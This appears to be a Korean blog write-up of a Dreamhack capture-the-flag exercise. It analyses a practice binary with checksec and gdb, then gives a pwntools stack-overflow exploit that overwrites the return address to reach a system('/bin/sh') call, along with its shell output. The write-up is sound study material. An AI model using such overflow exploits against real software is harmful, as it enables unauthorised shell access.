---
layout: post
title: "[Dreamhack] stack aligne test"
date: 2025-06-10 11:38 +0900
category: ['Syshack']
tag: ['system', 'dreamhack', 'hacking', 'pwn', 'pwnable', '드림핵', '보안', '시스템', '시스템해킹', '포너블', '해킹']
image: /assets/img/post/stack-aligne-test/image0.png
---

> **Dreamhack Syshack Lv.1**

## P1. 문제 분석
문제 파일을 다운받아 실행해보자.

![](/assets/img/post/stack-aligne-test/image1.png)

key라는 이름의 hex값이 있고 각 단계를 순서대로 통과해야한다고 한다.

각 스테이지는 어떻게 클리어해야할까?

![](/assets/img/post/stack-aligne-test/image2.png)

첫번째 단계에 대한 정보이다. 0xCAFEBABE 라는 값과 XOR 한게 인자 값과 같으면 통과 아니면 `exit()`를 실행한다.

이 단계를 3번 통과해야한다. 문제의 의도대로 진행하기 전, 다른 방법을 찾아보기 위하여 `checksec` 명령어를 
입력하여 보호기법을 확인해보자.

```shell
$ checksec ./chall
[*] './stack-aligne-test/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

`Stack`에서 `canary`를 찾을 수 없다고 나온다. `PIE`기법도 적용되어 있지 않기 때문에 각 함수에 접근할 수 있다.

그럼 함수의 시작 주소를 호출할 필요없이 특정 위치를 호출해 단계 검사를 우회할 수 있지 않을까?

그 특정 주소를 구하기 위해 gdb로 디스어셈블을 시도해보자.

```shell
   0x000000000040143c <+134>:   lea    rax,[rip+0xc81]        # 0x4020c4
   0x0000000000401443 <+141>:   mov    rdi,rax
   0x0000000000401446 <+144>:   call   0x4010b0 <system@plt>
   0x000000000040144b <+149>:   nop
   0x000000000040144c <+150>:   leave
   0x000000000040144d <+151>:   ret
```

`get_flag()`함수의 일부분이다. `lea	rax, [rip+0xc81]`로 `rax`레지스터에 `rip+0xc81`의 주소를 넣고 있다. 저 주소 안에는 무엇이 있는지 확인해보자.

```shell
gef➤  x/s 0x4020c4
0x4020c4:       "/bin/sh"
```

`/bin/sh` 문자열이 들어있는 것을 확인했다.

그렇다면, return overwrite 공격을 시도해 0x40143c의 코드를 실행하게 하면 되지 않을까?

overflow에 필요한 dummy를 구하는 방법은 `vulnerable()` 함수 내부를 살펴보면 알 수 있다.

```shell
   0x00000000004014e2 <+5>:     mov    rbp,rsp   # sfp 8byte
   0x00000000004014e5 <+8>:     sub    rsp,0x10  # stack 크기 0x10 -> 16byte
```

overflow가 가능한 입력인지도 확인해보자. 입력을 0x18 이상 받으면 overflow가 가능하다.

```shell
   0x000000000040150b <+46>:    mov    edx,0x100
   0x0000000000401510 <+51>:    mov    rsi,rax
   0x0000000000401513 <+54>:    mov    edi,0x0
   0x0000000000401518 <+59>:    call   0x4010d0 <read@plt>
```

`rdx` 레지스터에 0x100 만큼 넣는다. 어셈블리 코드에서는 `edx`라고 표현되지만 `x86_64` 프로그램이기 때문에 실제 데이터는 `rdx`에 들어가게 된다.

`read()`함수를 호출할 때 `rdx`는 입력을 받을 크기를 지정하기 때문에 0x100 만큼 입력을 받는 것을 알 수 있다.


## P2. Exploit code

```python
from pwn import *

e = ELF('./chall')
p = e.process() 			# local test

payload = b'a' * 0x18
payload += p64(0x40143c) 	# if bypass

p.sendafter(b'Input: ', payload)

p.interactive()
```

```shell
$ python3 ./ex1.py
[*] './stack-aligne-test/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './stack-aligne-test/chall': pid 18765
[*] Switching to interactive mode
$ ls
13637bed-c937-4fc3-b8f7-b44b3ec185a0.zip  chall.id1  chall.til
chall                                     chall.id2  ex.py
chall.id0                                 chall.nam  ex1.py
$ 
```

local에서 성공했으니 문제 서버에 공격을 시도해보자.

![](/assets/img/post/stack-aligne-test/image3.png)

**Clear!**